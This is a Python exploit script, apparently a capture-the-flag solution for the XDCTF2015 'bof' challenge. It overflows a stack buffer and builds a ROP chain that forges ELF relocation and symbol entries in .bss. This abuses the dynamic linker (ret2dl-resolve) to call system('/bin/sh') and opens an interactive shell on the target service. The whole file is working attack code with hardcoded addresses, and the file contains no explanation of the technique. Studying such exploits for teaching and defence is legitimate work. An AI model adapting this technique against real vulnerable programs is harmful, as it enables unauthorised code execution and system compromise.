from zio import *
from time import sleep

offset = 0x6c + 4
cmd    = '/bin/sh'

addr_plt_read  = 0x08048390   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x080483c0   # objdump -d -j.plt bof | grep "write"
addr_bss       = 0x0804a020   # readelf -S bof | grep ".bss"
bss_offset     = 0x800	      
addr_rel_plt   = 0x8048318    # objdump -s -j.rel.plt a.out
fake_resolve   = addr_bss +  bss_offset
fake_offset    = fake_resolve - addr_rel_plt

addr_plt_start = 0x08048370   # objdump -d -j.plt bof
addr_got_write = 0x804a020
#write_info     = 0x507
addr_dynsym    = 0x080481d8
addr_dynstr    = 0x08048268
align          = 0x10 - ((fake_resolve + 8 -addr_dynsym) & 0xF)
fake_info      = ((fake_resolve + 8 + align - addr_dynsym))/0x10 << 8 | 7
st_name        = fake_resolve + 24 +align - addr_dynstr

#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x0804856c

host = '127.0.0.1'
port = 2333
io   = zio((host, port))

#b *0x80484bcZZ
#raw_input()

io.read_until('Welcome to XDCTF2015~!\n')
#raw_input()

buf1  = 'A' * offset
buf1 += l32(addr_plt_read)
buf1 += l32(pppop_ret)
buf1 += l32(0)
buf1 += l32(fake_resolve)
buf1 += l32(100)

#buf1 += l32(addr_plt_write)
buf1 += l32(addr_plt_start)
#buf1 += l32(0x20)
buf1 += l32(fake_offset)
buf1 += 'BBBB'
buf1 += l32(fake_resolve + 80)
buf1 += 'BBBB'
buf1 += 'BBBB'
buf1 += 'A' * (100 - len(buf1))
io.write(buf1)

sleep(1)

buf2  = l32(addr_got_write)
#buf2 += l32(0x507)
buf2 += l32(fake_info)
buf2 += 'A' * align
#buf2 += l32(0x2f)
buf2 += l32(st_name)
buf2 += l32(0)
buf2 += l32(0)
buf2 += l32(12)
buf2 += "system\x00\x00"
buf2 += 'A' * ( 80 - len(buf2))
buf2 += cmd + '\x00'
buf2 += 'B' * (100 - len(buf2))

io.write(buf2)
#data = io.readline()
#print '1111' + data

io.interact()
